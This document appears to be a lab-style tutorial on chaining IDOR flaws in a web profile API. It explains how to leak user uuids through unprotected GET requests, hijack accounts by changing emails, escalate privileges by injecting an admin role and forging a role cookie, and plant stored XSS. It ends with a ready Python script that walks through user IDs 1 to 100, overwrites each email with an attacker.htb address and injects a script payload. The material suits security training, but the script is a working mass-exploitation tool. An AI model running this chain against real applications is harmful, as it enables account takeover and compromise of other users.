The most devastating IDOR attacks rarely rely on a single vulnerability. By chaining an **Information Disclosure** IDOR (to harvest hidden identifiers) with an **Insecure Function Call** IDOR (to perform unauthorized actions), you can completely bypass complex backend validation mechanisms and escalate privileges.

## The Exploitation Chain

When backend systems validate operations using hidden parameters (like a `uuid`) but fail to secure the read access (`GET` requests) for those same objects, you can create a loop of leaking and exploiting.

1. **Enumerate and Leak (Information Disclosure):** GET Request.
Send a `GET` request to another user's API endpoint (e.g., `GET /profile/api.php/profile/2`). If the endpoint lacks access controls, it will return the victim's JSON profile, leaking critical backend identifiers (like their `uuid`) and exposing internal configurations (like the exact string used for the admin `role`).


2. **Targeted Modification (Insecure Function Call):** PUT Request.
Using the leaked `uuid`, you can now bypass the backend's mismatch protections. Send a `PUT` request to the victim's endpoint to modify their data.

* **Account Hijacking:** Change their email address to one you control, then trigger a password reset.
* **Stored XSS:** Inject a malicious payload into a text field (like the `about` section) that executes when an admin reviews their profile.


3. **Privilege Escalation:** Self-Modification.
If your enumeration reveals the administrative role string (e.g., `"role": "web_admin"`), send a `PUT` request to your *own* profile (`/profile/api.php/profile/1`) and inject that role into your JSON payload. If successful, manually update your session cookie to match (`Cookie: role=web_admin`).


4. **Administrative Actions:** POST / DELETE Requests.
With your escalated privileges established in both the backend database and your client-side cookie, you can now successfully hit endpoints restricted to administrators, allowing you to create or delete arbitrary users.

## Mass Assignment Automation

Once you have administrative privileges (or a reliable way to bypass validation), you can automate mass modifications across the entire application. Since Python is exceptionally efficient for building custom security tooling and interacting with JSON APIs, you can script this chain to automatically fetch each user's `uuid` and overwrite their data.

```python
import requests
import json

base_url = "http://SERVER_IP:PORT/profile/api.php/profile/"
# Authenticate using the escalated privilege cookie
headers = {"Cookie": "role=web_admin", "Content-Type": "application/json"}

# Iterate through user IDs 1 to 100
for i in range(1, 101):
    target_url = f"{base_url}{i}"
    
    # Step 1: Trigger Information Disclosure to leak the UUID
    res = requests.get(target_url, headers=headers)
    
    if res.status_code == 200 and res.text.strip():
        user_data = res.json()
        leaked_uuid = user_data.get("uuid")
        
        # Step 2: Construct the Insecure Function Call payload
        payload = {
            "uid": i,
            "uuid": leaked_uuid,
            "role": user_data.get("role"),
            "full_name": user_data.get("full_name"),
            "email": "hacked@attacker.htb", # Hijacking the email
            "about": "<script>alert('XSS')</script>" # Injecting Stored XSS
        }
        
        # Step 3: Execute the modification
        update_res = requests.put(target_url, headers=headers, data=json.dumps(payload))
        print(f"[*] User {i} updated. Status: {update_res.status_code}")

```
